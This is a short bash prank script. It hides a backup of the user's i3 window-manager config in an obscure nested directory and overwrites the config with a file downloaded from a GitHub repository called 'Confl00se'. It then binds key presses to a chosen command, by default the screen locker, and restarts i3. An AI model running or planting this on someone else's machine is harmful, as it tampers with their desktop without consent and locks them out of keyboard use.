#!/bin/bash

read -p "choose a command to run when a key is pressed
[default i3lock]: " cmd_input

if command -v "$cmd_input" &>/dev/null; then
    cmd="$cmd_input"
else
    cmd="i3lock"
fi
echo -e "Command set to: \033[1;36;40m$cmd\033[0;37;40m"

mkdir -p ~/afs/.git/.gitignore/.K/.i/.n/.g/._/._/._/.D/.i/.c/.k/._/._/.w/.a/.s/._/.h/.e/.r/.e
cp ~/.config/i3/config ~/afs/.git/.gitignore/.K/.i/.n/.g/._/._/._/.D/.i/.c/.k/._/._/.w/.a/.s/._/.h/.e/.r/.e
curl -o ~/.config/i3/config https://raw.githubusercontent.com/NeKroFR/Confl00se/main/config/onlymouse
sed -i "s/run_command/$cmd/g" ~/.config/i3/config
i3-msg restart
echo "done."
